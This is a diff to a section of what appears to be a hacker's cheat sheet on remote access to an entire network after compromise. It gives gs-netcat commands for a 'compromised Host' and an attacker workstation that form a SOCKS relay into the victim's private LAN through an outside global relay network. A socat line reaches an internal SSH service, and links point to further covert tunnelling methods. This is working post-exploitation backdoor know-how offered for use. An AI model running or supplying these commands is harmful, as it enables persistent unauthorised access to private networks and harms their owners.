@@ -1003,7 +1003,7 @@ c3zxLNse/xg0CC16elJpt7IqCFV19AqfHnK4YiXwVJ+M+PyAp/aEAujtHDHp backup@ubuntu
 <a id="backdoor-network"></a>
 **6.iii. Remote Access to an entire network**
 
-Install [gs-netcat](https://github.com/hackerschoice/gsocket). It creates a SOCKS relay on the Host's private lan which is accessible through the Global Relay network without the need to run your own server (e.g. directly from your workstation):
+Install [gs-netcat](https://github.com/hackerschoice/gsocket). It creates a SOCKS exit-node on the Host's private LAN which is accessible through the Global Socket Relay Network without the need to run your own relay-server (e.g. access the remote private LAN directly from your workstation):
 
 ```sh
 gs-netcat -l -S       # compromised Host
@@ -1016,8 +1016,11 @@ gs-netcat -p 1080    # Your workstation.
 # Access route.local:22 on the Host's private LAN from your Workstation:
 socat -  "SOCKS4a:127.1:route.local:22"
 ```
+Read [Use any tool via Socks Proxy](#scan-proxy).
 
-Use -T to use TOR.
+Other methods:
+* [Gost/Cloudflared](https://iq.thc.org/tunnel-via-cloudflare-to-any-tcp-service) - our very own article
+* [Reverse Wireguard](https://thc.org/segfault/wireguard) - from segfault.net to any (internal) network.
 
 ---
 <a id="shell-hacks"></a>
